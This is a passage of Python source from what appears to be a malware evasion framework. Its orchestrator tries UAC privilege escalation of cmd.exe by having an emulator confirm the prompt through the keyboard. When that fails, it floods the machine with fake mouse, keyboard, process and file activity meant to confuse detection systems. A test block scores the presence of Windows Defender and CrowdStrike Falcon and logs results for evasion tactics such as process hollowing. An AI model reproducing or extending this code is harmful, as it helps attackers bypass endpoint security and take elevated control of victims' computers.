    def attempt_privesc_escalation(self, escalation_exe: Optional[str] = None) -> PrivescFallbackResult:
        """
        Attempt privilege escalation via UAC prompt.
        
        Args:
            escalation_exe: Path to executable to elevate (default: cmd.exe)
        
        Returns:
            PrivescFallbackResult with success/failure details
        """
        result = PrivescFallbackResult(
            stage="privesc_attempted",
            threat_pre=self.threat_scorer.calculate_score(),
            escalation_exe=escalation_exe or "C:\\Windows\\System32\\cmd.exe"
        )
        
        if not self.HAS_EMULATOR:
            logger.warning("[PRIVESC-FALLBACK] Emulator unavailable, cannot attempt escalation")
            result.escalation_success = False
            result.details['error'] = 'emulator_unavailable'
            return result
        
        try:
            # Use emulator's uac_escalation method
            if result.escalation_exe and self.activity_emulator:
                logger.info(f"[PRIVESC-FALLBACK] Attempting UAC escalation of {result.escalation_exe}")
                
                self.activity_emulator.uac_escalation(  # type: ignore
                    exe_path=result.escalation_exe,
                    args="",
                    wait_seconds=2.5
                )
            else:
                raise ValueError("escalation_exe is None")
            
            result.escalation_success = True
            result.threat_post = self.threat_scorer.calculate_score()
            result.details['escalation_method'] = 'uac_prompt_keyboard_confirm'
            
            logger.info(
                f"[PRIVESC-FALLBACK] UAC escalation completed "
                f"(threat: {result.threat_pre} → {result.threat_post})"
            )
            
            return result
            
        except Exception as e:
            logger.error(f"[PRIVESC-FALLBACK] Escalation failed: {e}")
            result.escalation_success = False
            result.threat_post = self.threat_scorer.calculate_score()
            result.details['error'] = str(e)
            return result
    
    def fallback_to_behavioral_noise(self, intensity: int = 90) -> PrivescFallbackResult:
        """
        Fallback to maximum intensity behavioral noise when privesc unavailable.
        
        Generates intense user activity to confuse detection systems:
        - High frequency mouse/keyboard activity
        - Multiple app launches
        - File system operations
        - Network patterns
        
        Args:
            intensity: Behavioral noise intensity (0-100)
        
        Returns:
            PrivescFallbackResult with noise details
        """
        result = PrivescFallbackResult(
            stage="fallback_to_noise",
            threat_pre=self.threat_scorer.calculate_score(),
            behavioral_noise_intensity=intensity
        )
        
        if not self.HAS_NOISE:
            logger.warning("[PRIVESC-FALLBACK] Behavioral noise unavailable, cannot fallback")
            result.details['error'] = 'noise_unavailable'
            return result
        
        try:
            logger.info(
                f"[PRIVESC-FALLBACK] Falling back to behavioral noise (intensity={intensity}%)"
            )
            
            # Set maximum noise intensity to confuse detection
            if self.behavioral_noise:
                self.behavioral_noise.set_threat_level(intensity)  # type: ignore
            
            # If we have the emulator, also run intent-driven activity at max intensity
            if self.HAS_EMULATOR and self.activity_emulator:
                for _ in range(3):  # 3 cycles of intense activity
                    self.activity_emulator.emit_user_activity(  # type: ignore
                        threat_level=intensity,
                        intention="aggressive"
                    )
            
            result.threat_post = self.threat_scorer.calculate_score()
            result.details['noise_duration'] = f'{3 * 5}s'  # 3 cycles × ~5s each
            result.details['activities'] = [
                'high_frequency_mouse_movements',
                'rapid_keyboard_input',
                'process_launches',
                'file_operations',
                'window_switching'
            ]
            
            logger.info(
                f"[PRIVESC-FALLBACK] Behavioral noise fallback deployed "
                f"(threat: {result.threat_pre} → {result.threat_post})"
            )
            
            return result
            
        except Exception as e:
            logger.error(f"[PRIVESC-FALLBACK] Behavioral noise fallback failed: {e}")
            result.details['error'] = str(e)
            return result
    
    def orchestrate_privesc_fallback(self, 
                                    escalation_exe: Optional[str] = None,
                                    auto_fallback: bool = True) -> Optional[PrivescFallbackResult]:
        """
        Main orchestration: Privesc → Noise cascading strategy.
        
        Stage 1: Check if evasion is failing (should_attempt_privesc)
        Stage 2: If yes, try UAC escalation with emulator
        Stage 3: If escalation fails, fallback to behavioral noise
        
        Args:
            escalation_exe: Executable to escalate (default: cmd.exe)
            auto_fallback: If True, automatically fallback to noise on privesc failure
        
        Returns:
            PrivescFallbackResult from final stage (or None if privesc not needed)
        """
        
        # Stage 1: Check if privesc is warranted
        if not self.should_attempt_privesc():
            logger.debug("[PRIVESC-FALLBACK] Evasion still effective, privesc not needed")
            return None
        
        logger.info("[PRIVESC-FALLBACK] Privesc attempt triggered")
        
        # Stage 2: Attempt privilege escalation
        privesc_result = self.attempt_privesc_escalation(escalation_exe)
        self.results.append(privesc_result)
        
        # Stage 3: If privesc failed and auto-fallback enabled, cascade to noise
        if not privesc_result.escalation_success and auto_fallback:
            logger.warning(
                "[PRIVESC-FALLBACK] Privesc failed, cascading to behavioral noise fallback"
            )
            noise_result = self.fallback_to_behavioral_noise(self.NOISE_INTENSITY_FALLBACK)
            self.results.append(noise_result)
            return noise_result
        
        return privesc_result
    
    def get_orchestration_history(self) -> List[Dict[str, Any]]:
        """Retrieve full history of privesc/fallback attempts"""
        return [
            {
                'timestamp': r.timestamp,
                'stage': r.stage,
                'threat_pre': r.threat_pre,
                'threat_post': r.threat_post,
                'escalation_exe': r.escalation_exe,
                'escalation_success': r.escalation_success,
                'behavioral_noise_intensity': r.behavioral_noise_intensity,
                'details': r.details
            }
            for r in self.results
        ]


# Global privesc orchestrator
_global_privesc_orchestrator: Optional[PrivescFallbackOrchestrator] = None


def get_global_privesc_orchestrator() -> PrivescFallbackOrchestrator:
    """Get or create global privesc fallback orchestrator"""
    global _global_privesc_orchestrator
    if _global_privesc_orchestrator is None:
        _global_privesc_orchestrator = PrivescFallbackOrchestrator()
    return _global_privesc_orchestrator


if __name__ == '__main__':
    print("[*] Testing Threat Calibration System\n")
    
    # Create scorer
    scorer = get_global_threat_scorer()
    
    # Simulate threat signals
    scorer.add_signal(ThreatSignal('windows_defender', True, 80, 15))
    scorer.add_signal(ThreatSignal('registry_monitoring', True, 70, 10))
    
    score1 = scorer.calculate_score()
    print(f"Score (Defender + monitoring): {score1}/100")
    
    # Add EDR
    scorer.add_signal(ThreatSignal('crowdstrike_falcon', True, 95, 35))
    score2 = scorer.calculate_score()
    print(f"Score (+ CrowdStrike): {score2}/100")
    
    # Test intent awareness
    intent = get_global_intent_engine()
    env = intent.assess_environment()
    print(f"\nDetected environment: {env}")
    print(f"Signals: {intent.context_signals}")
    
    # Test learner
    learner = get_global_learner()
    learner.record_validation_result(EvasionValidationResult(
        'process_hollowing', 50, 25, 50.0, {}, success=True
    ))
    learner.record_validation_result(EvasionValidationResult(
        'behavioral_noise', 55, 45, 18.0, {}, success=True
    ))
    
    print(f"\nTactic status:")
    for tactic, stats in learner.get_tactic_status().items():
        print(f"  {tactic}: {stats}")
